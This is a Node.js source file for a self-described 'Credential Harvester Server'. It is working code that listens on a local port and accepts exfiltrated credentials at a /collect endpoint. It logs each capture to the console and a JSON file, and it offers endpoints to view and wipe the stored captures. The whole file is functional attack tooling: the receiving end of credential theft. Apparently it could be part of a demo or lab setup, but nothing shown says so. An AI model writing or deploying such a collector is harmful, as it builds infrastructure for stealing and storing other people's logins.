/**
 * Credential Harvester Server
 * Receives and logs exfiltrated credentials
 */

const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3001;
const logFile = path.join(__dirname, 'captured-credentials.json');

// Initialize log file
if (!fs.existsSync(logFile)) {
  fs.writeFileSync(logFile, JSON.stringify({ captures: [] }, null, 2));
}

const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/collect') {
    let body = '';
    
    req.on('data', chunk => {
      body += chunk.toString();
    });
    
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        
        // Log to console
        console.log('\n🎯 CAPTURED CREDENTIALS:');
        console.log(JSON.stringify(data, null, 2));
        console.log('─'.repeat(50));
        
        // Save to file
        const captures = JSON.parse(fs.readFileSync(logFile, 'utf8'));
        captures.captures.push({
          timestamp: new Date().toISOString(),
          data: data
        });
        fs.writeFileSync(logFile, JSON.stringify(captures, null, 2));
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'success', message: 'Credentials received' }));
      } catch (e) {
        console.error('Error processing credentials:', e);
        res.writeHead(400);
        res.end('Bad Request');
      }
    });
  } else if (req.method === 'GET' && req.url === '/captured-credentials') {
    // Endpoint to view captured credentials
    const captures = fs.readFileSync(logFile, 'utf8');
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(captures);
  } else if (req.method === 'DELETE' && req.url === '/captured-credentials') {
    // Endpoint to clear captured credentials
    fs.writeFileSync(logFile, JSON.stringify({ captures: [] }, null, 2));
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'success', message: 'Credentials cleared' }));
  } else {
    res.writeHead(404);
    res.end('Not Found');
  }
});

server.listen(PORT, () => {
  console.log('🎭 Credential Harvester Started');
  console.log('─'.repeat(50));
  console.log(`Listening on http://localhost:${PORT}`);
  console.log('');
  console.log('Endpoints:');
  console.log(`  POST   /collect              - Receive exfiltrated credentials`);
  console.log(`  GET    /captured-credentials  - View captured credentials`);
  console.log(`  DELETE /captured-credentials  - Clear captured credentials`);
  console.log('─'.repeat(50));
  console.log('Waiting for credentials...\n');
});

